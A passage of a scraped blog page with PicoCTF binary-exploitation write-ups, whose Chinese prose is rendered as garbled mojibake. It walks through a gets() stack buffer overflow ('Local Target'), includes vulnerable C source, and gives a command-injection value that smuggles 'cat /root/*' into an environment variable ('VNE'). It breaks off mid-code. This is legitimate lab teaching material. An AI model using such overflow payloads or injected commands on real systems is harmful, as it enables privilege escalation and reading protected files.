class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div></div><div class="stars"><div class="star big"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star big"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star medium"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star medium"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star small"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star small"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div></div></div></div></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="Discover a random post" href="javascript:void(0);"><i class="fontawesome fa-solid fa-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="SearchğŸ”" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> Search</span></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://buymeacoffee.com/S1l3ntC0nquer" target="_blank"><img class="post-qr-code-img" alt="Buy Me a Coffee" src="/web/assets/buymeacoffee.png"></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="https://s1l3ntc0nquer.github.io/web" target="_blank"><img class="post-qr-code-img" alt="S1l3ntC0nquer" src="/web/assets/me.jpg"></a><div class="post-qr-code-desc">S1l3ntC0nquer</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">Engage</div><span class="author-content-item-title">Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">Points of interest</div><span class="author-content-item-title">Find your area of â€‹â€‹interest</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/web/tags/CTF-Crypto-Cryptography-CyberSec-TechStreak30/" style="font-size:1.05rem">-CTF - Crypto -Cryptography - CyberSec - TechStreak30<sup>1</sup></a><a href="/web/tags/CTF-PicoCTF-CyberSec-TechStreak30/" style="font-size:1.05rem">-CTF - PicoCTF - CyberSec - TechStreak30<sup>1</sup></a><a href="/web/tags/CTF-Security/" style="font-size:1.05rem">-CTF -Security<sup>1</sup></a><a href="/web/tags/AI/" style="font-size:1.05rem">AI<sup>1</sup></a><a href="/web/tags/AIS3/" style="font-size:1.05rem">AIS3<sup>1</sup></a><a href="/web/tags/Assembly-Code/" style="font-size:1.05rem">Assembly Code<sup>1</sup></a><a href="/web/tags/Blog/" style="font-size:1.05rem">Blog<sup>1</sup></a><a href="/web/tags/Byte-Code/" style="font-size:1.05rem">Byte Code<sup>1</sup></a><a href="/web/tags/CCEP/" style="font-size:1.05rem">CCEP<sup>1</sup></a><a href="/web/tags/CRT/" style="font-size:1.05rem">CRT<sup>1</sup></a><a href="/web/tags/CTF/" style="font-size:1.05rem">CTF<sup>28</sup></a><a href="/web/tags/Crypto/" style="font-size:1.05rem">Crypto<sup>5</sup></a><a href="/web/tags/Cryptography/" style="font-size:1.05rem">Cryptography<sup>1</sup></a><a href="/web/tags/CyberSec/" style="font-size:1.05rem">CyberSec<sup>27</sup></a><a href="/web/tags/Cybersecurity/" style="font-size:1.05rem">Cybersecurity<sup>10</sup></a><a href="/web/tags/GDSC/" style="font-size:1.05rem">GDSC<sup>1</sup></a><a href="/web/tags/GTU/" style="font-size:1.05rem">GTU<sup>1</sup></a><a href="/web/tags/GamePwn/" style="font-size:1.05rem">GamePwn<sup>1</sup></a><a href="/web/tags/HITCON/" style="font-size:1.05rem">HITCON<sup>1</sup></a><a href="/web/tags/HTB/" style="font-size:1.05rem">HTB<sup>14</sup></a><a href="/web/tags/HackTheBox/" style="font-size:1.05rem">HackTheBox<sup>10</sup></a><a href="/web/tags/Hacker/" style="font-size:1.05rem">Hacker<sup>2</sup></a><a href="/web/tags/Hacking/" style="font-size:1.05rem">Hacking<sup>1</sup></a><a href="/web/tags/HacktTheBox/" style="font-size:1.05rem">HacktTheBox<sup>1</sup></a><a href="/web/tags/Hardware/" style="font-size:1.05rem">Hardware<sup>2</sup></a><a href="/web/tags/Machine-Code/" style="font-size:1.05rem">Machine Code<sup>1</sup></a><a href="/web/tags/Math/" style="font-size:1.05rem">Math<sup>2</sup></a><a href="/web/tags/Misc/" style="font-size:1.05rem">Misc<sup>1</sup></a><a href="/web/tags/PicoCTF/" style="font-size:1.05rem">PicoCTF<sup>12</sup></a><a href="/web/tags/Pwn/" style="font-size:1.05rem">Pwn<sup>15</sup></a><a href="/web/tags/Registers/" style="font-size:1.05rem">Registers<sup>1</sup></a><a href="/web/tags/Reverse/" style="font-size:1.05rem">Reverse<sup>1</sup></a><a href="/web/tags/SCIST/" style="font-size:1.05rem">SCIST<sup>2</sup></a><a href="/web/tags/SQLi/" style="font-size:1.05rem">SQLi<sup>1</sup></a><a href="/web/tags/TechStreak30/" style="font-size:1.05rem">TechStreak30<sup>7</sup></a><a href="/web/tags/Web/" style="font-size:1.05rem">Web<sup>3</sup></a><a href="/web/tags/Web-Development/" style="font-size:1.05rem">Web Development<sup>1</sup></a></div></div><hr></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>Article</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/web/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/web/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/web/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/web/archives/2024/07/"><span class="card-archive-list-date">July 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">26</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/web/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/web/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>Post(s)</span></div></a></li></ul></div><hr></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="Showæ¨¡å¼Switch" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="é‚Šæ¬„Showæ§åˆ¶"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="Popular"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="Musicé–‹é—œ"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="Switch"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">Original</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/web/categories/PicoCTF/" itemprop="url">PicoCTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/web/tags/PicoCTF/" tabindex="-1" itemprop="url"> <span><i class="anzhiyufont anzhiyu-icon-hashtag"></i>PicoCTF</span></a><a class="article-meta__tags" href="/web/tags/Cybersecurity/" tabindex="-1" itemprop="url"> <span><i class="anzhiyufont anzhiyu-icon-hashtag"></i>Cybersecurity</span></a></span></div></div><h1 class="post-title" itemprop="name headline">All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-06-01T02:27:03.000Z" title="Created 2024-06-01 07:57:03">2024-06-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-12-15T10:30:36.096Z" title="Updated 2024-12-15 16:00:36">2024-12-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="Article Length"></i><span class="post-meta-label" title="Article Length">Word count:</span><span class="word-count" title="Article Length">4.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="Reading time"></i><span class="post-meta-label" title="Reading time">Reading time:</span><span>21min</span></span><span class="post-meta-separator"></span><span data-flag-title="All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="Reading volume">Post views:</span><span id="twikoo_visitors" title="Visits"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator"> </span><span class="post-meta-position" title="The authorâ€™s IP location is Kathana"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>Kathana</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/web/posts/6526bdbd/#post-comment" tabindex="-1"><span id="twikoo-count"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://s1l3ntc0nquer.github.io/web/posts/6526bdbd/"><header><a class="post-meta-categories" href="/web/categories/PicoCTF/" itemprop="url">PicoCTF</a><a href="/web/tags/PicoCTF/" tabindex="-1" itemprop="url">PicoCTF</a><a href="/web/tags/Cybersecurity/" tabindex="-1" itemprop="url">Cybersecurity</a><h1 id="CrawlerTitle" itemprop="name headline">All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">S1l3ntC0nquer</span><time itemprop="dateCreated datePublished" datetime="2024-06-01T02:27:03.000Z" title="Created 2024-06-01 07:57:03">2024-06-01</time><time itemprop="dateCreated datePublished" datetime="2024-12-15T10:30:36.096Z" title="Updated 2024-12-15 16:00:36">2024-12-15</time></header><h1 id="å‰è¨€">å‰è¨€</h1><p>å…¶å¯¦å¥½åƒä¹Ÿæ²’ä»€éº¼å¥½è¬›å‰è¨€çš„ï¼Œä½†å°±æ˜¯ä¸æƒ³è¦ä¸€é–‹å§‹å°±æ˜¯é¡Œç›®åˆ†é¡ï¼Œæ‰€ä»¥é‚„æ˜¯æ”¾äº†å€‹å‰è¨€ XDã€‚</p><p>è‡ªå·±åœ¨åˆ· PicoCTF çš„æ™‚å€™å¸¸å¸¸ç™¼ç¾ï¼Œå¹¾ä¹æ‰€æœ‰çš„ writeup éƒ½æ˜¯è‹±æ–‡çš„å±…å¤šï¼Œæ‰€ä»¥æƒ³èªªä¾†å¯«å€‹å®Œæ•´ä¸€é»çš„ä¸­æ–‡ç‰ˆï¼ç¸½ä¹‹å‘¢é€™è£¡å°±æ˜¯æœƒç›¡é‡å½™æ•´æ‰€æœ‰çš„ picoCTF çš„é¡Œç›®åœ¨é€™é‚Šï¼ˆä½†æ˜¯å› ç‚ºå·²ç¶“å¯«äº† 60 é¡Œå·¦å³æ‰é–‹å§‹æ‰“ç®—ä¾†å¯« writeupï¼Œæ‰€ä»¥å¯èƒ½å‰é¢çš„éƒ¨åˆ†æœƒç­‰å…¶ä»–éƒ½å¯«å®Œå†ä¾†è£œï¼‰ï¼Œå¦‚æœæœ‰éœ€è¦å°±å¯ä»¥ç›´æ¥ä¾†é€™é‚Šçœ‹æ‰€æœ‰çš„ writeupï¼Œå°±é€™æ¨£å•¦ï¼å¸Œæœ›èƒ½å¹«å¿™åˆ°ä½ ã€‚</p><h1 id="Local-Target">Local Target</h1><p>é€™é¡Œçµ¦äº†ä¸€å€‹å¯åŸ·è¡Œçš„æª”æ¡ˆå’Œ C èªè¨€çš„ä»£ç¢¼ï¼Œå…ˆä¾†åˆ†æä¸€ä¸‹ä»–çš„ä»£ç¢¼å§ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  FILE <span class="token operator">*</span>fptr<span class="token punctuation">;</span>
  <span class="token keyword">char</span> c<span class="token punctuation">;</span>

  <span class="token keyword">char</span> input<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter a string: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"num is %d\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">65</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You win!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Open file</span>
    fptr <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Cannot open file.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// Read contents from file</span>
    c <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>fptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
      c <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>fptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bye!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç•¶ä½¿ç”¨ Netcat é€£ç·šåˆ°é¡Œç›®çš„æ™‚å€™ï¼Œæœƒå¦‚åŒä¸‹é¢ä¸€èˆ¬ã€‚</p><p><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701161031231.png" alt="é¡Œç›®"></p><p><strong>åˆ†æä»£ç¢¼</strong></p><ol><li><code>char input[16];</code>å®£å‘Šäº†ä¸€å€‹é•·åº¦ç‚º 16 çš„å­—å…ƒé™£åˆ—ï¼Œå„²å­˜ä½¿ç”¨è€…è¼¸å…¥ã€‚</li><li><code>gets(input);</code>ç²å–ä½¿ç”¨è€…è¼¸å…¥ï¼Œç”±æ–¼ <code>gets</code>å‡½æ•¸ä¸æª¢æŸ¥è¼¸å…¥çš„é•·åº¦ï¼Œä½¿ç”¨è€…å¯ä»¥è¼¸å…¥è¶…é 16 å€‹å­—å…ƒã€‚ï¼ˆ<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40907279/article/details/89046366">å±é™©å‡½æ•° gets()å‡ ç§å®Œç¾çš„æ›¿ä»£æ–¹æ³• ä½ å¯èƒ½è¿˜ä¸çŸ¥é“çš„</a>ï¼‰</li><li><code>int num = 64;</code>å®£å‘Šä¸¦åˆå§‹åŒ–è®Šæ•¸ <code>num</code>ã€‚</li><li>æ‹¿åˆ° flag çš„æ¢ä»¶æ˜¯è¦è®“ num çš„å€¼ç‚º 65ã€‚</li></ol><p>é€™é‚Šæˆ‘å€‘å¯ä»¥ç”¨ <code>man gets</code>æŒ‡ä»¤é€²å…¥ gets çš„ man æ‰‹å†Šé ï¼Œçœ‹ä¸€ä¸‹ä»–çš„ bug å€å¡Šï¼Œäº†è§£ gets åˆ°åº•å±éšªåœ¨å“ªè£¡ã€‚</p><p><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240702142351553.png" alt="Bug of gets function"></p><p><strong>BOF æ”»æ“Š</strong></p><p>é¦–å…ˆï¼Œå…ˆæª¢æŸ¥ä¸€ä¸‹ä»–æœ‰æ²’æœ‰ä»»ä½•ä¿è­·æ©Ÿåˆ¶ã€‚</p><p><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701171059944.png" alt="Checksec from pwntools"></p><p>ä»–æ²’æœ‰ <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">Canary</a> ä¹Ÿæ²’æœ‰ <a target="_blank" rel="noopener" href="https://ithelp.ithome.com.in/articles/10336777">PIE</a>ï¼Œå°±æ­£å¸¸åš BOF å°±å¯ä»¥äº†ã€‚</p><p>å› ç‚º <code>input</code>å’Œ <code>num</code>éƒ½æ˜¯å€åŸŸè®Šæ•¸ï¼Œæ‰€ä»¥æœƒå­˜åœ¨ Stack ä¸­ã€‚ä¸¦ä¸”å› ç‚ºæ˜¯å…ˆå®£å‘Š <code>input</code>ç·Šæ¥è‘—å®£å‘Š <code>num</code>ï¼Œæ‰€ä»¥åœ¨ Stack ä¸­æœƒåƒä¸‹é¢é€™æ¨£ï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">High Address
|
|---------------------|
|  Return Address     | &lt;-- top
|---------------------|
|  Frame Pointer      |
|---------------------|
|  int num            | &lt;-- 4 Bytes
|---------------------|
|  char input[16]     | &lt;-- 16 Bytes
|---------------------|
|
Low Address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€å¾Œè©¦å‡ºä¾†çš„ Payload æ˜¯ 24 å€‹å­—å…ƒåŠ ä¸Šä¸€å€‹å¤§å¯«çš„ Aï¼ˆå› ç‚º <code>ord(A) == 65</code>ï¼‰ï¼Œä½†æ˜¯åœ¨é€™è£¡æˆ‘æœ‰é»ä¸ç†è§£ç‚ºç”šéº¼å‰é¢æ˜¯ 24 å€‹å¡«å……ï¼ŒçŒœæ¸¬æ˜¯ <code>input[16]</code>è·Ÿ <code>num</code>ä¸­é–“æœ‰ Padding ä¹‹é¡çš„æ±è¥¿ã€‚å¦‚æœæœ‰äººçŸ¥é“çš„è©±å†éº»ç…©è·Ÿæˆ‘è§£é‡‹ä¸€ä¸‹ï¼Œæ„Ÿè¬äº†ï¼ç¸½ä¹‹ï¼Œé‚„æ˜¯æ‹¿åˆ° Flag å•¦ã€‚</p><p><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240704141242017.png" alt="Flag"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;l0c4l5_1n_5c0p3_fee8ef05&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="VNE">VNE</h1><p>é€™é¡Œå…ˆ SSH é€£ä¸Šå»å¾Œç™¼ç¾é¡Œç›®æœ‰èªªçµ¦äº†ä¸€å€‹å«åš<code>bin</code> çš„ binary ä¾†åŸ·è¡Œ <code>ls</code> å‘½ä»¤ã€‚é¡Œç›®æ˜¯é€™æ¨£èªªçš„ã€‚</p><blockquote><p>Weâ€™ve got a binary that can list directories as root, try it out !!</p></blockquote><p>ä½†ç•¶æˆ‘å€‘å˜—è©¦åŸ·è¡Œå¾Œæœƒç™¼ç¾ä»–èªªTips Error: SECRET_DIR environment variable is not setï¼Œæ‰€ä»¥æˆ‘å€‘çŸ¥é“è¦å»è¨­ç½®ç’°å¢ƒè®Šæ•¸ï¼ŒåŸä¾†é€™é¡Œç›®çš„åå­— VNE å°±æ˜¯ ENV çš„å€’éä¾†ã€‚</p><p>é‚£å…ˆå˜—è©¦å°‡ä»–è¨­ç½®ç‚ºTipsèªªçš„ <code>/root</code> ç›®éŒ„è©¦è©¦çœ‹ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">SECRET_DIR</span><span class="token operator">=</span>/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ctf-player@pico-chall$ ./bin 
Listing the content of /root as root: 
flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç™¼ç¾ä¸‹é¢æœ‰å€‹ <code>flag.txt</code>ï¼Œé‚£æˆ‘å€‘è¦å¦‚ä½•è®€å–åˆ°ä»–å‘¢ï¼Ÿåˆ°é€™é‚Šæˆ‘å€‘å¤§æ¦‚å¯ä»¥çŒœæ¸¬ï¼Œé€™é¡Œå…¶å¯¦æ˜¯ä¸€å€‹ Command Injection é¡Œã€‚æˆ‘çŒœæ¸¬ä»–èƒŒå¾Œçš„ç¨‹å¼é‚è¼¯å°±æ˜¯å»åŸ·è¡Œé¡ä¼¼æ–¼ <code>ls $SECRET_DIR</code> ä¹‹é¡çš„æ±è¥¿ï¼Œæ‰€ä»¥æŠŠç’°å¢ƒè®Šæ•¸æ”¹ç‚ºå¦‚ä¸‹ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">SECRET_DIR</span><span class="token operator">=</span><span class="token string">"/root&amp;cat /root/*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ”¹å®Œå¾Œå†å»åŸ·è¡Œ <code>./bin</code> å°±å‡ºä¾†äº†ï¼</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;Power_t0_man!pul4t3_3nv_d0cc7fe2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="buffer-overflow-0">buffer overflow 0</h1><p>é€™é¡Œä¹Ÿæ˜¯çµ¦äº†å¯åŸ·è¡Œæ–‡ä»¶å’Œæºä»£ç¢¼ï¼Œå…ˆä¸‹è¼‰ä¸‹ä¾†çœ‹çœ‹ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FLAGSIZE_MAX</span> <span class="token expression"><span class="token number">64</span></span></span>

<span class="token keyword">char</span> flag<span class="token punctuation">[</span>FLAGSIZE_MAX<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">sigsegv_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// é€™è£¡æœƒprintå‡ºflag</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
